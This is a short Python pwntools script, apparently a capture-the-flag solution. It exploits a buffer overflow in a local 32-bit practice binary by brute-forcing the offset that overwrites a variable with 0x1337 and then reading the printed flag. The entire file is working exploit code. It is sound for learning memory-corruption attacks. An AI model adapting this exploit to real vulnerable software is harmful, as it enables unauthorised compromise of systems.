#!/bin/python3
from pwn import *

'''
This code exploits buffer overflow vulnerability
in 'task1' (source: task1.c) stored in this repository.
'''

# This loop finds the correct offset length
# to overwrite the variable 'Zwiedzajacy' to 0x1337.
# (task1 is 32-bit so loop's step is 4 [bytes])
for offset in range(16, 200, 4):

    # Constructing the payload.
    payload = flat({
        offset: 0x1337
    })

    # Executing task1, sending payload and receiving the output.
    io = process('./task1')
    io.sendlineafter(':', payload) # ':' indicates when we should send the payload.
    output = io.recv()
    
    # If we've overwritten the correct value and passed task1's if statement,
    # there should be "Oto flaga:" in the output.
    if b'Oto flaga:' in output:

        result = 'Found flag with offset of length ' + str(offset)
        print(result)
        print(output.decode('utf-8'))

        # Getting the rest of the output if there is any, beacause the flag might still be stuck there
        try:
            print(io.recv().decode('utf-8'))
        except EOFError as e:
            ...

        # Killing the process and exiting the loop.
        io.kill()
        break 
    
    # Ending unsuccessful process.
    io.kill()
